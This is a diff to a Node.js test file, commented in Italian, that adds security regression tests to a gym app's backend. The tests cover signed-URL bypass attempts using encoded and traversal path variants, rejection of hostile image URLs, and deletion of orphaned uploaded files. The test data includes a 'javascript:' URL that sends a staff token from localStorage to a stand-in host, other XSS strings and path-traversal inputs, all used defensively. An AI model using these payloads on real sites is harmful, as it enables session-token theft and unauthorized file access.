@@ -7,7 +7,7 @@
 // test esiste.
 import test, { before, after, describe } from 'node:test';
 import assert from 'node:assert/strict';
-import { writeFileSync, rmSync, mkdirSync } from 'node:fs';
+import { writeFileSync, rmSync, mkdirSync, existsSync } from 'node:fs';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { buildApp } from '../src/app.js';
@@ -77,6 +77,33 @@ describe("aprire un file caricato", () => {
 		const vecchia = firmaUrl(`/uploads/${NOME}`, unMeseFa);
 
 		assert.equal((await chiedi(vecchia)).statusCode, 404);
+	});
+
+	// Il router decodifica l'indirizzo prima di scegliere la rotta: un controllo fatto sul
+	// testo grezzo si aggirava scrivendo `/uploads/` in un altro modo. `/%75ploads/` (`%75` è
+	// la `u`) serviva il file senza firma.
+	test("scritto in un altro modo, l'indirizzo non si apre lo stesso", async () => {
+		const varianti = [
+			`/%75ploads/${NOME}`,
+			`/%75%70%6c%6f%61%64%73/${NOME}`,
+			`/uploads/%5f%5fprova-file-protetti.txt`,
+			`/uploads%2F${NOME}`,
+			`/%2Fuploads/${NOME}`,
+			`//uploads/${NOME}`,
+			`/./uploads/${NOME}`,
+			`/x/../uploads/${NOME}`,
+			`/UPLOADS/${NOME}`,
+		];
+		for (const url of varianti) {
+			const risposta = await chiedi(url);
+			assert.ok(!risposta.body.includes('riservato'), `file servito senza firma con ${url} (${risposta.statusCode})`);
+		}
+	});
+
+	test("la firma non si porta da un file a un percorso con dentro una barra", async () => {
+		// Il nome firmato è sempre un nome solo: un percorso annidato non è un nostro file.
+		const firmato = firmaUrl(`/uploads/sotto/${NOME}`);
+		assert.equal((await chiedi(firmato)).statusCode, 404);
 	});
 
 	// Le intestazioni che impedivano a un file caricato di comportarsi da pagina del nostro
@@ -169,13 +196,83 @@ describe("l'indirizzo che arriva alle schermate è già firmato", () => {
 		assert.equal((rileggi.image_url.match(/firma=/g) ?? []).length, 1);
 		assert.equal(togliFirma(rileggi.image_url), `https://gripcore.it/uploads/${NOME}`);
 	});
+
+	// Le schermate mettono gli indirizzi dei file in un `<a href>`, e React non blocca
+	// `javascript:`: un indirizzo scritto a mano era codice che girava al clic di chi apriva il
+	// documento. Entra solo un file caricato da noi.
+	test("un indirizzo che non è un nostro file non entra, né in creazione né in modifica", async () => {
+		const scrivi = (method, url, payload) => app.inject({ method, url, headers: { authorization: `Bearer ${token}` }, payload });
+		const cattivi = [
+			"javascript:fetch('https://esempio.it/?t='+localStorage.grip_staff_token)",
+			'JavaScript:alert(1)',
+			'data:text/html,<script>alert(1)</script>',
+			'https://esempio.it/malevolo.pdf',
+			'/uploads/../index.html',
+			'/uploads/sotto/file.pdf',
+		];
+		for (const image_url of cattivi) {
+			const creato = await scrivi('POST', '/api/entities/Exercise', { name: '__Prova url cattivo', muscle_group: 'petto', image_url });
+			assert.equal(creato.statusCode, 400, `creazione accettata con ${image_url}`);
+			const bulk = await scrivi('POST', '/api/entities/Exercise/bulk', [{ name: '__Prova url cattivo', muscle_group: 'petto', image_url }]);
+			assert.equal(bulk.statusCode, 400, `creazione multipla accettata con ${image_url}`);
+			const modificato = await scrivi('PUT', `/api/entities/Exercise/${idEsercizio}`, { image_url });
+			assert.equal(modificato.statusCode, 400, `modifica accettata con ${image_url}`);
+		}
+	});
+
+	// "Non si può recuperare", diceva la conferma: ma il file restava sul disco, e con lui i
+	// certificati medici. Un file sostituito o di una riga eliminata va cancellato davvero.
+	test('un file sostituito o di una riga eliminata sparisce dal disco', async () => {
+		const scrivi = (method, url, payload) => app.inject({ method, url, headers: { authorization: `Bearer ${token}` }, payload });
+		const vecchio = `__prova-vecchio-${Date.now()}.png`;
+		const nuovo = `__prova-nuovo-${Date.now()}.png`;
+		writeFileSync(path.join(UPLOAD_DIR, vecchio), 'x');
+		writeFileSync(path.join(UPLOAD_DIR, nuovo), 'y');
+
+		const creato = await scrivi('POST', '/api/entities/Exercise', { name: '__Prova cancellazione', muscle_group: 'petto', image_url: `/uploads/${vecchio}` });
+		assert.equal(creato.statusCode, 201, creato.body);
+		const idProva = creato.json().id;
+
+		assert.equal((await scrivi('PUT', `/api/entities/Exercise/${idProva}`, { image_url: `/uploads/${nuovo}` })).statusCode, 200);
+		assert.equal(existsSync(path.join(UPLOAD_DIR, vecchio)), false, 'il file sostituito è rimasto');
+		assert.equal(existsSync(path.join(UPLOAD_DIR, nuovo)), true);
+
+		assert.equal((await scrivi('DELETE', `/api/entities/Exercise/${idProva}`)).statusCode, 200);
+		assert.equal(existsSync(path.join(UPLOAD_DIR, nuovo)), false, 'il file della riga eliminata è rimasto');
+	});
+
+	test('un file citato anche da un’altra riga non si cancella', async () => {
+		const scrivi = (method, url, payload) => app.inject({ method, url, headers: { authorization: `Bearer ${token}` }, payload });
+		const condiviso = `__prova-condiviso-${Date.now()}.png`;
+		writeFileSync(path.join(UPLOAD_DIR, condiviso), 'z');
+		const a = (await scrivi('POST', '/api/entities/Exercise', { name: '__Prova A', muscle_group: 'petto', image_url: `/uploads/${condiviso}` })).json();
+		const b = (await scrivi('POST', '/api/entities/Exercise', { name: '__Prova B', muscle_group: 'petto', image_url: `/uploads/${condiviso}` })).json();
+
+		await scrivi('DELETE', `/api/entities/Exercise/${a.id}`);
+		assert.equal(existsSync(path.join(UPLOAD_DIR, condiviso)), true, "l'altra riga lo usa ancora");
+		await scrivi('DELETE', `/api/entities/Exercise/${b.id}`);
+		assert.equal(existsSync(path.join(UPLOAD_DIR, condiviso)), false);
+	});
+
+	test('un indirizzo vuoto resta ammesso: vuol dire "nessun file"', async () => {
+		const modificato = await app.inject({
+			method: 'PUT',
+			url: `/api/entities/Exercise/${idEsercizio}`,
+			headers: { authorization: `Bearer ${token}` },
+			payload: { image_url: null },
+		});
+		assert.equal(modificato.statusCode, 200, modificato.body);
+	});
 });
 
 describe('la firma, come pezzo a sé', () => {
 	test("lo stesso file ha lo stesso indirizzo per un'ora", () => {
 		// Se cambiasse a ogni lettura, la cache del browser non servirebbe a niente e la
 		// foto di ogni esercizio verrebbe riscaricata a ogni apertura della pagina.
-		const adesso = Date.now();
+		// Un istante fisso a metà dell'ora: la scadenza è arrotondata all'ora, e con
+		// `Date.now()` negli ultimi cinque minuti di ogni ora `adesso + 5 min` cadrebbe
+		// nell'ora dopo e il test fallirebbe senza che il codice sia sbagliato.
+		const adesso = Date.UTC(2026, 0, 1, 10, 30);
 		assert.equal(
 			firmaUrl(`/uploads/${NOME}`, adesso),
 			firmaUrl(`/uploads/${NOME}`, adesso + 5 * 60 * 1000)
